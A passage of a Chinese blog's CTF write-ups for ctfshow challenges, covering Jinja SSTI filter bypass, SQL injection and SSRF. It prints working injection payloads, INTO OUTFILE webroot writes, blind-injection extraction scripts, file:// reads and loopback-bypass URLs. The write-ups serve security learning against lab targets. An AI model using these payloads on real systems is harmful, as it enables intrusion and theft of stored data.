class="hljs-built_in">len</span>(s)-<span class="hljs-number">1</span>:<br>t+=<span class="hljs-string">&#x27;chr(&#x27;</span>+aaa(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(s[i])))+<span class="hljs-string">&#x27;)%2b&#x27;</span><br><span class="hljs-keyword">else</span>:<br>t+=<span class="hljs-string">&#x27;chr(&#x27;</span>+aaa(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(s[i])))+<span class="hljs-string">&#x27;)&#x27;</span><br><span class="hljs-keyword">return</span> t<br><span class="hljs-built_in">print</span>(ccchr(s))<br></code></pre></td></tr></table></figure><h3 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h3><p>这一题过滤了 <code>count</code> 可以使用 <code>length</code>过滤器，将上题的 <code>count</code>替换为<code>length</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> c=(t|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cc=(<span class="hljs-built_in">dict</span>(e=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccc=(<span class="hljs-built_in">dict</span>(ee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccc=(<span class="hljs-built_in">dict</span>(eee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccc=(<span class="hljs-built_in">dict</span>(eeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccc=(<span class="hljs-built_in">dict</span>(eeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccc=(<span class="hljs-built_in">dict</span>(eeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccc=(<span class="hljs-built_in">dict</span>(eeeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeeeee=a)|join|length)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> coun=(ccc~ccccc)|<span class="hljs-built_in">int</span>%&#125;<br>&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=a,p=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> a=(()|select|string|<span class="hljs-built_in">list</span>)|attr(po)(coun)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini=(a,a,<span class="hljs-built_in">dict</span>(init=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> glo=(a,a,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> geti=(a,a,<span class="hljs-built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> built=(a,a,<span class="hljs-built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=x.<span class="hljs-built_in">chr</span>%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd=<br>%&#125;<br>&#123;%<span class="hljs-keyword">if</span> x.<span class="hljs-built_in">eval</span>(cmd)%&#125;<br>abc<br>&#123;%endif%&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_SQL注入</title>
    <link href="/2023/08/24/ctfshow_SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/08/24/ctfshow_SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>直接用万能密码  ： ‘ or 1&#x3D;1 –+</p><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p><img src="https://s2.loli.net/2022/11/24/2qSpLN8jeftZGil.png" alt="image-20221123101922271"></p><p>由于结果中不能带有flag，所以我们可以使用联合查询，直接查询密码，密码中不含flag</p><h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p><img src="https://s2.loli.net/2022/11/24/rvFoV3Ob6n1u94M.png" alt="image-20221123102141695"></p><p>同上</p><h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p><img src="https://s2.loli.net/2022/11/24/ul2hDG1EqwjrnaW.png" alt="image-20221123102318570"></p><p>此题忽略了flag和0-9数字，我们可以使用to_base64（）或hex（）函数编码，然后使用replace（）将数字0-9进行替换，最后将结果替换回来即可</p><p>也可以使用盲注</p><h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p><img src="https://s2.loli.net/2022/11/24/k97TD5ymfzcr1H6.png" alt="image-20221124223650423"></p><p>此题目没有回显，可以采用时间盲注</p><p>写脚本跑一下：</p><p><img src="https://s2.loli.net/2022/11/24/76mcb4WEx1pAPrl.png" alt="image-20221123110808841"></p><p>解法二：</p><p>使用写入文件，写到网站根目录</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user5 <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/a.txt&quot;</span>--+<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/11/24/pJO6lLUzKj2o7Ga.png" alt="image-20221123111021130" style="zoom:25%;" /><h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p>直接使用万能密码： ‘ or 1&#x3D;1 –+</p><h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>这一题好像把空格和注释符 –+ 过滤了，</p><p>可以使用 %0a,%0b，%0c…，&#x2F;**&#x2F;等代替空格，%23代替注释</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">绕过空格姿势:<span class="hljs-comment">(暂时只想起来这么多后面再补)</span><br><span class="hljs-meta">%</span><span class="hljs-number">09</span> <span class="hljs-meta">%</span><span class="hljs-number">0</span>a <span class="hljs-meta">%</span><span class="hljs-number">0</span>c <span class="hljs-meta">%</span><span class="hljs-number">0</span>b <span class="hljs-meta">%</span><span class="hljs-number">0</span>d <span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>bselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,password%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>dctfshow_user%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>aselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,password%<span class="hljs-number">0</span>cfrom%<span class="hljs-number">0</span>actfshow_user%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>和上题类似</p><h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>cunion%<span class="hljs-number">0</span>cselect%<span class="hljs-number">0</span>c1,<span class="hljs-number">2</span>,password%<span class="hljs-number">0</span>cfrom%<span class="hljs-number">0</span>cctfshow_user%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>使用%0c代替空格，%0a，%09被过滤了</p><h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>cunion%<span class="hljs-number">0</span>cselect%<span class="hljs-number">0</span>c1,group_concat(password),&#x27;<span class="hljs-number">3</span>&#x27;%<span class="hljs-number">0</span>cfrom%<span class="hljs-number">0</span>cctfshow_user%<span class="hljs-number">0</span>cwhere%<span class="hljs-number">0</span>c&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以使用 –%0c 代替 –+达到注释的效果</p><p>该题目把注释符 %23  + 给注释了</p><h3 id="web181-182"><a href="#web181-182" class="headerlink" title="web181-182"></a>web181-182</h3><p><img src="https://s2.loli.net/2022/11/24/xVaWp9d8weSOJus.png" alt="image-20221123114141680"></p><p>该题把所有空格注释了，可以使用()去填充表达式，不使用空格</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27;or(id=26)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>    后面要使用and<br></code></pre></td></tr></table></figure><p>也可以使用盲注</p><h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p><img src="https://s2.loli.net/2022/11/24/apJ5kZGMseHwymB.png" alt="image-20221123120717443"></p><p><img src="https://s2.loli.net/2022/11/24/tNnhUAmXoPYF5Id.png" alt="image-20221123120231503"></p><p>使用盲注</p><p><img src="https://s2.loli.net/2022/11/24/PqTg5bwfZHG2Li6.png" alt="image-20221124223612771"></p><h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><p><img src="https://s2.loli.net/2022/11/24/hysda4fMonpRmUc.png" alt="image-20221123120703419"></p><p>此处没有过滤空格，过滤了where 单引号，双引号，</p><p>解法一：</p><p>使用右连接查询 right join:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># @Author:Y4tacker</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php&quot;</span><br><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">45</span>):<br>    <span class="hljs-keyword">if</span> i &lt;= <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span>  j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        data = &#123;<br>            <span class="hljs-string">&quot;tableName&quot;</span>: <span class="hljs-string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="hljs-subst">&#123;i&#125;</span>,1)regexp(char(<span class="hljs-subst">&#123;j&#125;</span>)))&quot;</span><br>        &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(j) != <span class="hljs-string">&quot;.&quot;</span>:<br>                flag += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag.lower())<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(j) == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                    exit(<span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>解法二：</p><p>使用group by 分组，然后使用having过滤，16进制代替字符串     盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2022/11/19 21:23</span><br><span class="hljs-comment"># @Author : LIKE</span><br><span class="hljs-comment"># @File : web184.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://4abca1ef-10dc-4717-a183-9f9667d1ed59.challenge.ctf.show/select-waf.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>word = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    rel = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        temp = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        rel += temp<br>    <span class="hljs-keyword">return</span> rel<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> word:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;0x&quot;</span> + str_to_hex(flag + j + <span class="hljs-string">&quot;%&quot;</span>))<br>        &#125;<br>        text = requests.post(url=url, data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 1;&#x27;</span> <span class="hljs-keyword">in</span> text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>                exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_SSRF漏洞</title>
    <link href="/2023/08/24/ctfshow_SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctfshow_SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="一、知识点"><a href="#一、知识点" class="headerlink" title="一、知识点"></a>一、知识点</h3><h4 id="Ⅰ、SSRF攻击点"><a href="#Ⅰ、SSRF攻击点" class="headerlink" title="Ⅰ、SSRF攻击点"></a>Ⅰ、SSRF攻击点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>curl_init()：初始curl会话<br>curl_setopt()：会话设置<br>curl_exec()：执行curl会话,获取内容<br>curl_close()：会话关闭</p></blockquote><h4 id="Ⅱ、gopher协议"><a href="#Ⅱ、gopher协议" class="headerlink" title="Ⅱ、gopher协议"></a>Ⅱ、gopher协议</h4><p>通过gopher协议，将请求体用url编码后加上任意字符,一般是下划线，接上gopher的url即可执行GET、POST请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">gopher:<span class="hljs-comment">//ip:port/_[stream]</span><br></code></pre></td></tr></table></figure><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><img src="https://s2.loli.net/2022/12/18/aYrXZ5GDJlPItbc.png" alt="image-20221218214527289" style="zoom:33%;" /><p>我们可以使用post传入url的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/flag.php</span><br></code></pre></td></tr></table></figure><p>这样的话，在服务器上，就会使用 curl_exec($ch) 函数去执行访问该url，并且返回文件中的内容，然后使用echo输出</p><p>如果我们直接去访问，肯定访问不到，因为该文件在服务器内网上</p><p><strong>解法二</strong>：</p><p>我们可以使用file协议：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">///var/www/html/flag.php</span><br>或<br>file:<span class="hljs-comment">//127.0.0.1/var/www/html/flag.php</span><br></code></pre></td></tr></table></figure><p>网页使用的是 linux服务器，所以网站根目录一般是 &#x2F;var&#x2F;www&#x2F;html&#x2F; 下，file协议可以读取本地计算机文件内容，</p><p>使用该参数后，就可以将flag.php中内容给读取出来了</p><p>右键源代码：</p><p><img src="https://s2.loli.net/2022/12/18/GDd2jTeFsEV51ui.png" alt="image-20221218215625894"></p><h4 id="file协议："><a href="#file协议：" class="headerlink" title="file协议："></a>file协议：</h4><p>英文原义：File Protocol </p><p>中文释义：本地文件传输协议</p><p> 注解：File协议<strong>主要</strong>用于<strong>访问本地计算机中的文件</strong>，就如同在Windows资源管理器中打开文件一样。</p><p>应用：要使用File协议，基本的格式如下：<strong>file:&#x2F;&#x2F;&#x2F;文件路径</strong>，比如要打开D盘images文件夹中的<a href="https://links.jianshu.com/go?to=file:///D:/images/pic.gif">pic.gif</a>文件，那么可以在资源管理器或IE地址栏中键入：<a href="https://links.jianshu.com/go?to=file:///D:/images/pic.gif"><strong>file:&#x2F;&#x2F;&#x2F;D:&#x2F;images&#x2F;pic.gif</strong></a>  然后回车。</p><h4 id="file表示协议类型"><a href="#file表示协议类型" class="headerlink" title="file表示协议类型"></a>file表示协议类型</h4><p>:&#x2F;&#x2F;后面是机器的网络地址（IP地址）</p><p>&#x2F;后面是文件夹（目录）和文件名</p><p>整体形如：</p><p><strong>file:&#x2F;&#x2F;机器的IP地址&#x2F;目录&#x2F;文件</strong></p><p>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p>对于本地机器，根目录下的目录是Windows下的盘符，如“C:”、“D:”等。</p><p>file:&#x2F;&#x2F;127.0.0.1&#x2F;C:&#x2F;    本地C盘</p><p>file:&#x2F;&#x2F;localhost&#x2F;D:&#x2F;    本地D盘</p><p>file:&#x2F;&#x2F;&#x2F;E:&#x2F;            本地E盘</p><p>需要注意的是，最后面的&#x2F;是必不可少的，且file协议，通常只能在Windows Explorer和Micosoft IE中使用！</p><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><img src="https://s2.loli.net/2022/12/18/4BpJVZKdmr1LYoP.png" alt="image-20221218215711180" style="zoom:33%;" /><h4 id="parse-url-函数"><a href="#parse-url-函数" class="headerlink" title="parse_url() 函数"></a>parse_url() 函数</h4><blockquote><p>parse_url()是PHP中的一个内置函数，主要用于解析URL返回其组成部分，语法格式“**parse_url($url,$component&#x3D;-1)**”；该函数解析一个URL ，并返回一个包含URL各种组成部分的关联数组。</p></blockquote><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url </span>= <span class="hljs-string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_SCHEME));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_USER));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PASS));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PORT));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PATH));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_QUERY));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_FRAGMENT));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">8</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  [<span class="hljs-string">&quot;port&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  [<span class="hljs-string">&quot;query&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  [<span class="hljs-string">&quot;fragment&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br></code></pre></td></tr></table></figure><p>这一题的初衷可能是想要过滤 localhost 和 127.0.0.1  ，但是没有写过滤哪个字符串，所以我们之间用上题解法即可。</p><p>由于题目规定只能使用http&#x2F;https 协议，所以我们不能继续使用file协议了</p><p>解法：</p><p>一、我们可以将127.0.0.1 进行进制转化，或者将localhost进行大小写绕过</p><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">ip地址转换</a></p><p>二、我们可以将127.0.0.1写成以下形式：</p><blockquote><p>127.1会被解析成127.0.0.1，也就意味着为零可缺省<br>在Linux中，0也会被解析成127.0.0.1<br>127.0.0.0&#x2F;8是一个环回地址网段，从<strong>127.0.0.1 ~ 127.255.255.254都表示localhost</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">[POST]payload：url=http:<span class="hljs-comment">//127.1/flag.php</span><br>[POST]payload：url=http:<span class="hljs-comment">//0/flag.php</span><br>[POST]payload：url=http:<span class="hljs-comment">//127.255.255.254/flag.php</span><br>[POST]payload：url=http:<span class="hljs-comment">//2130706433/flag.php</span><br>还可以使用  句号<br></code></pre></td></tr></table></figure><h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><img src="https://s2.loli.net/2022/12/18/zKfySPgin52aGb6.png" alt="image-20221218221359005" style="zoom: 33%;" /><p>忽略大小写，过滤了句号。 也可以使用上面的payload</p><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><img src="https://s2.loli.net/2022/12/18/4vA82XsjhitlL9Y.png" alt="image-20221218221819060" style="zoom:33%;" /><p>又把数字给过滤了，</p><p>解法一：</p><p>了解到一个神奇的域名 ,会解析为127.0.0.1 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 